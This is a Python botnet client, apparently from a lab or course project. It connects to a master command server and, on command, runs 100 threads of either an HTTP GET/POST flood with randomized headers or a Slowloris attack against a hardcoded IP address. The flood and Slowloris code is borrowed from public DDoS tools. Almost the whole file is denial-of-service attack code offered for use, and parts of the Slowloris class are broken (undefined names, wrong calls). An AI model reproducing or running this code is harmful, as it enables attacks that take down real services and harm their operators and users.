import socket
import sys
import string
import http.client
import argparse
import threading
import select
import struct
from random import *
import time

#from progress.bar import Bar


RECV_BUFFER = 4096
ENCODING = 'utf-8'

class Bot():

	def __init__(self, server: str, port: int):
		self.master_server = server
		self.master_port = port
		self.sock: socket.socket = None
		self.master_socket: socket.socket = None
		self.authenticated = False
		self.socket_list: list[socket.socket] = []
		self.target_address: str = ''
		self.attack_type: int = 0
		self.attacking: bool = False

		
	def start(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		#self.sock.bind((self.host, self.port))							#seems to work without
		self.sock.connect((self.master_server, self.master_port))
		#self.sock.listen()												#cant listen() and connect()?
		self.socket_list.append(self.sock)
		print(f"connected to master server at {self.master_server}:{self.master_port}")    

		try:
			while True:
				read_sockets, _, exception_sockets = select.select(
					self.socket_list, [], self.socket_list
				)

				for notified_socket in read_sockets:
					self._request_router(notified_socket)

				for notified_socket in exception_sockets:
					self._disconnect_wrapper(notified_socket)

		except KeyboardInterrupt:
			print('caught keyboard interrupt, exiting')
		except Exception as e:
			print(f'ran into an error:\n\t{e}')
		finally:
			self.sock.close()
			sys.exit()

	def _request_router(self, sock: socket.socket):                        
		sock_addr = sock.getpeername()
		recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
		print(f'received request from ${sock_addr}')
		try:
			if recv_data:
				try:
					request = recv_data.split(":")
					if request[0] == 'whoami':
						self.master_socket = sock   
						self.sock.send("iam:bot".encode(ENCODING))
					elif request[0] == 'iam':
						if request[1] == 'error':                           
							print("iam command error:", request[2])
						elif request[1] == 'success': 
							self.authenticated = True
					elif request[0] == 'changeip':                              #did they decide to include port?
						self.target_address = request[1]
					elif request[0] == 'changeattk':
						self.attack_type = int(request[1])
					elif request[0] == 'startattk':          
						self.attacking = True
						if self.attack_type == 1:
							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
								t = threading.Thread(target=self.attack1)	
								t.start()

						if self.attack_type == 2:
							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
								t = threading.Thread(target=self.attack2)	
								t.start()
					elif request[0] == 'stopattk':
						self.attacking = False
					else:
						print(
							f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
						)
						response = f'{request[0]}:error:cannot handle request'.encode(
							ENCODING)
						sock.send(response)
				except ValueError:
					print(f'cannot parse request!')
					response = '_:error:cannot parse request'.encode(ENCODING)
					sock.send(response)
			# No data received means that client closed gracefully
			else:
				self._disconnect_wrapper(sock)
		# Abrupt client disconnect
		except Exception as e:
			print(e)
			self._disconnect_wrapper(sock)
		return

	def _disconnect_wrapper(self, sock: socket.socket):
		self.socket_list.remove(sock)
		sock_addr = sock.getpeername()
		sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])
		print(f'master server {sock_addr_str} disconnected')
		self.sock.close()
		sys.exit()

	def attack1(self):
		attack = RequestAttack('68.146.50.254')       
		while self.attacking == True:							
			attack.run()
		
	def attack2(self):
		attack2 = SlowLorisAttack('68.146.50.254', 9999) 
		while self.attacking == True:
			attack2.run()



''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''

class RequestAttack():
	
	def __init__(self, target: str):         
		self.target = target
	
	def header(self):                                   
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		bot = self.add_bots()
		c = choice(cachetype)
		a = choice(acceptEc)
		http_header = {
			'User-Agent' : choice(self.add_useragent()),
			'Cache-Control' : c,
			'Accept-Encoding' : a,
			'Keep-Alive' : '42',
			'Host' : self.target,
			'Referer' : choice(bot)
		}
		return http_header
		
	def add_useragent(self):								### random useragents each time
		uagents = []
		uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
		uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
		uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
		uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
		uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
		uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
		uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
		uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
		return uagents

	def add_bots(self):                                     ### random websites the request comes from
		bots = []
		bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
		bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
		return bots

	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters + string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)                          ### randomstring = ___&___&___        
	
	def create_url(self):								### creates random url by adding '?' + randomstring
		return self.target + '?' + self.rand_str()

	def run(self):                                                          
		try:	
			connection = http.client.HTTPConnection(self.target, port = 9999, timeout = 1)		### hardcoded port for our target server
			url = self.create_url()
			http_header = self.header()
			method = choice(['GET','POST'])
			connection.request(method, url, None, http_header)
			connection.close()
		except socket.timeout:
			connection.close()
		except KeyboardInterrupt:
			sys.exit(print('Canceled by user'))
		except Exception as e:
			print(e)
			sys.exit()
	  
''' End of referenced code '''


''' Original code from: Author: 0xc0d Github: https://github.com/0xc0d/Slow-Loris/blob/master/SlowLoris.py '''
#regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
     #               "Accept-language: en-US,en,q=0.5"]
class SlowLorisAttack():
   # regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    #                "Accept-language: en-US,en,q=0.5"]

    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.regualr_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                    "Accept-language: en-US,en,q=0.5"]


    def init_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((self.target,self.port))
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))

        for header in regular_headers:
            sock.send('{}\r\n'.format(header).encode('UTF-8'))

        return sock

    def run(self):
        #if len(sys.argv)<5:
         #   print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
          #  return

        #ip = sys.argv[1]
        #port = sys.argv[2]
        socket_count= 100   # can adjust
        #bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
        timer = 10          # can adjust
        socket_list=[]

        for _ in range(int(socket_count)):
            try:
                sock = init_socket(self)
            except socket.error:
                break
            socket_list.append(sock)
            #next(bar)

        #bar.finish()

        while True:
                try:
                        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))

                        for s in socket_list:
                            try:
                                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
                            except socket.error:
                                socket_list.remove(s)

                        for _ in range(socket_count - len(socket_list)):
                            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
                            try:
                                s = init_socket(ip,port)
                                if s:
                                    socket_list.append(s)
                            except socket.error:
                                break

                        time.sleep(timer)
                except socket.timeout:
                        socket.close()
                except KeyboardInterrupt:
                        sys.exit(print('Canceled by user'))
                except Exception as e:
                        print(e)
                        sys.exit()
                

    #if __name__=="__main__":
     #   main()
    ''' End of referenced code'''

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description = 'Bot Agent')
	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
						default='', help='Interface the server listens at')
	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
						help='TCP port (default 8080)')
	args = parser.parse_args()
	bot = Bot(args.a, args.p)
	bot.start()
